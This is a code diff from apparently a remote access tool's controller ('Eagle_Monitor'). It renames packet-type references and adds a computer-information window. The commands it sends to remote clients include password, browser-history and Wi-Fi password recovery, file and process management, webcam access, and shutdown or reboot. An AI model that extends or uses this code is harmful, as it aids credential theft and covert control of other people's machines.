@@ -36,11 +36,11 @@ namespace Eagle_Monitor.Clients
                         C.passwordsForm.loadingCircle1.Active = true;
                         C.passwordsForm.passwordsListView.Items.Clear();
                         Data D = new Data();
-                        D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                        D.Type = Shared.PacketType.PLUGIN;
                         D.Plugin = Plugins.Recovery;
                         D.IP_Origin = C.IP;
                         D.HWID = C.HWID;
-                        D.DataReturn = new object[] { Shared.PacketTypes.PacketType.PASSWORDS };
+                        D.DataReturn = new object[] { Shared.PacketType.PASSWORDS };
                         Task.Run(() => C.SendData(D.Serialize()));
                     }
                     return;
@@ -69,11 +69,11 @@ namespace Eagle_Monitor.Clients
                         C.historyForm.loadingCircle1.Active = true;
                         C.historyForm.historyListView.Items.Clear();
                         Data D = new Data();
-                        D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                        D.Type = Shared.PacketType.PLUGIN;
                         D.Plugin = Plugins.Recovery;
                         D.IP_Origin = C.IP;
                         D.HWID = C.HWID;
-                        D.DataReturn = new object[] { Shared.PacketTypes.PacketType.HISTORY };
+                        D.DataReturn = new object[] { Shared.PacketType.HISTORY };
                         Task.Run(() => C.SendData(D.Serialize()));
                     }
                     return;
@@ -103,11 +103,11 @@ namespace Eagle_Monitor.Clients
                         C.wifiForm.loadingCircle1.Active = true;
                         C.wifiForm.wifiPasswordsListView.Items.Clear();
                         Data D = new Data();
-                        D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                        D.Type = Shared.PacketType.PLUGIN;
                         D.Plugin = Plugins.Recovery;
                         D.IP_Origin = C.IP;
                         D.HWID = C.HWID;
-                        D.DataReturn = new object[] { Shared.PacketTypes.PacketType.WIFI };
+                        D.DataReturn = new object[] { Shared.PacketType.WIFI };
                         Task.Run(() => C.SendData(D.Serialize()));
                     }
                     return;
@@ -137,11 +137,11 @@ namespace Eagle_Monitor.Clients
                         C.processManagerForm.loadingCircle1.Active = true;
                         C.processManagerForm.processesListView.Items.Clear();
                         Data D = new Data();
-                        D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                        D.Type = Shared.PacketType.PLUGIN;
                         D.Plugin = Plugins.ProcessManager;
                         D.IP_Origin = C.IP;
                         D.HWID = C.HWID;
-                        D.DataReturn = new object[] { Shared.PacketTypes.PacketType.GET_PROC };
+                        D.DataReturn = new object[] { Shared.PacketType.GET_PROC };
                         Task.Run(() => C.SendData(D.Serialize()));
                     }
                     return;
@@ -171,11 +171,11 @@ namespace Eagle_Monitor.Clients
                         C.fileManagerForm.loadingCircle1.Active = true;
                         C.fileManagerForm.filesListView.Items.Clear();
                         Data D = new Data();
-                        D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                        D.Type = Shared.PacketType.PLUGIN;
                         D.Plugin = Plugins.FilesManager;
                         D.IP_Origin = C.IP;
                         D.HWID = C.HWID;
-                        D.DataReturn = new object[] { Shared.PacketTypes.PacketType.GET_D };
+                        D.DataReturn = new object[] { Shared.PacketType.GET_D };
                         Task.Run(() => C.SendData(D.Serialize()));
                     }
                     return;
@@ -270,11 +270,11 @@ namespace Eagle_Monitor.Clients
                         C.webCamForm.loadingCircle1.Active = true;
                         C.webCamForm.webCamComboBox.Items.Clear();
                         Data D = new Data();
-                        D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                        D.Type = Shared.PacketType.PLUGIN;
                         D.Plugin = Plugins.WebCam;
                         D.IP_Origin = C.IP;
                         D.HWID = C.HWID;
-                        D.DataReturn = new object[] { Shared.PacketTypes.PacketType.GET_CAMERAS };
+                        D.DataReturn = new object[] { Shared.PacketType.GET_CAMERAS };
                         Task.Run(() => C.SendData(D.Serialize()));
                     }
                     return;
@@ -290,7 +290,7 @@ namespace Eagle_Monitor.Clients
                 if (I.SubItems[1].Text == C.IP)
                 {
                     Data D = new Data();
-                    D.Type = Shared.PacketTypes.PacketType.CLOSE;
+                    D.Type = Shared.PacketType.CLOSE;
                     D.IP_Origin = C.IP;
                     D.HWID = C.HWID;
                     Task.Run(() => C.SendData(D.Serialize()));
@@ -307,7 +307,7 @@ namespace Eagle_Monitor.Clients
                 if (I.SubItems[1].Text == C.IP)
                 {
                     Data D = new Data();
-                    D.Type = Shared.PacketTypes.PacketType.UNINSTALL_TASKSCH;
+                    D.Type = Shared.PacketType.UNINSTALL_TASKSCH;
                     D.IP_Origin = C.IP;
                     D.HWID = C.HWID;
                     Task.Run(() => C.SendData(D.Serialize()));
@@ -324,11 +324,11 @@ namespace Eagle_Monitor.Clients
                 if (I.SubItems[1].Text == C.IP)
                 {
                     Data D = new Data();
-                    D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                    D.Type = Shared.PacketType.PLUGIN;
                     D.Plugin = Plugins.Miscellaneous;
                     D.IP_Origin = C.IP;
                     D.HWID = C.HWID;
-                    D.DataReturn = new object[] { Shared.PacketTypes.PacketType.POWER_OFF_SYS };
+                    D.DataReturn = new object[] { Shared.PacketType.POWER_OFF_SYS };
                     Task.Run(() => C.SendData(D.Serialize()));
                     return;
                 }
@@ -343,11 +343,11 @@ namespace Eagle_Monitor.Clients
                 if (I.SubItems[1].Text == C.IP)
                 {
                     Data D = new Data();
-                    D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                    D.Type = Shared.PacketType.PLUGIN;
                     D.Plugin = Plugins.Miscellaneous;
                     D.IP_Origin = C.IP;
                     D.HWID = C.HWID;
-                    D.DataReturn = new object[] { Shared.PacketTypes.PacketType.REBOOT_SYS };
+                    D.DataReturn = new object[] { Shared.PacketType.REBOOT_SYS };
                     Task.Run(() => C.SendData(D.Serialize()));
                     return;
                 }
@@ -362,11 +362,11 @@ namespace Eagle_Monitor.Clients
                 if (I.SubItems[1].Text == C.IP)
                 {
                     Data D = new Data();
-                    D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                    D.Type = Shared.PacketType.PLUGIN;
                     D.Plugin = Plugins.Miscellaneous;
                     D.IP_Origin = C.IP;
                     D.HWID = C.HWID;
-                    D.DataReturn = new object[] { Shared.PacketTypes.PacketType.LOG_OUT_SYS };
+                    D.DataReturn = new object[] { Shared.PacketType.LOG_OUT_SYS };
                     Task.Run(() => C.SendData(D.Serialize()));
                     return;
                 }
@@ -381,11 +381,11 @@ namespace Eagle_Monitor.Clients
                 if (I.SubItems[1].Text == C.IP)
                 {
                     Data D = new Data();
-                    D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                    D.Type = Shared.PacketType.PLUGIN;
                     D.Plugin = Plugins.Miscellaneous;
                     D.IP_Origin = C.IP;
                     D.HWID = C.HWID;
-                    D.DataReturn = new object[] { Shared.PacketTypes.PacketType.SUSPEND_SYS };
+                    D.DataReturn = new object[] { Shared.PacketType.SUSPEND_SYS };
                     Task.Run(() => C.SendData(D.Serialize()));
                     return;
                 }
@@ -400,12 +400,39 @@ namespace Eagle_Monitor.Clients
                 if (I.SubItems[1].Text == C.IP)
                 {
                     Data D = new Data();
-                    D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                    D.Type = Shared.PacketType.PLUGIN;
                     D.Plugin = Plugins.Miscellaneous;
                     D.IP_Origin = C.IP;
                     D.HWID = C.HWID;
-                    D.DataReturn = new object[] { Shared.PacketTypes.PacketType.HIBERNATE_SYS };
+                    D.DataReturn = new object[] { Shared.PacketType.HIBERNATE_SYS };
                     Task.Run(() => C.SendData(D.Serialize()));
+                    return;
+                }
+            }
+        }
+
+        internal static void ComputerInformation() 
+        {
+            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
+            {
+                Client C = Client.ClientDictionary[I.SubItems[1].Text];
+                if (I.SubItems[1].Text == C.IP)
+                {
+                    try
+                    {
+                        C.informationForm.Text = "Computer Information: " + C.IP; C.informationForm.Show();
+                    }
+                    catch (Exception)
+                    {
+                        if (I.SubItems[8].Text == "64")
+                        {
+                            C.informationForm = new InformationForm(C.HWID, C.IP, true); C.informationForm.Text = "Computer Information: " + C.HWID; C.informationForm.Show();
+                        }
+                        else
+                        {
+                            C.informationForm = new InformationForm(C.HWID, C.IP, false); C.informationForm.Text = "Computer Information: " + C.HWID; C.informationForm.Show();
+                        }
+                    }
                     return;
                 }
             }
